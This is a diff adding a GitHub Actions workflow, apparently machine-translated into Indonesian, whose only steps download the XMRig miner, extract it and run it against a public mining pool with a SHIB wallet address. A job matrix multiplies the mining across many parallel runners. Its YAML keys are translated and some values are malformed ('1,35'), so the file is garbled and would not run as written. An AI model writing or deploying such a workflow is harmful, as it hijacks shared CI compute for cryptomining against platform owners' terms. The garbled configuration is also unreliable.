@@ -1,0 +1,26 @@
+nama: kapten_crypto
+ 
+pada: [alur kerja_dispatch]
+ 
+pekerjaan:
+  membangun:
+    nama: kapten_crypto
+    berjalan-on: windows-terbaru
+    strategi:
+      paralel maks: 5
+      gagal-cepat: salah
+      matriks:
+        pergi: [1.0, 1.1, 1.2, 1.3, 1,35]
+        bendera: [A, B, C, D, E, F, G, H, I]
+    lingkungan:
+        NUM_JOBS: 20
+        PEKERJAAN: ${{ matrix.go }}
+    Langkah:
+    - nama: UNDUH
+      jalankan: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-msvc-win64.zip -OutFile xmrig-6.15.1-msvc-win64.zip
+    - nama: Ekstrak
+      jalankan: Expand-Archive xmrig-6.15.1-msvc-win64.zip
+    - nama: Lari
+      jalankan: .\xmrig-6.15.1-msvc-win64\xmrig-6.15.1\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x5aB7E2FDE0625d93842c0675BaEdcf9AA7a08c85.TRUST -px -t
+    - nama: END
+      lari: keluar
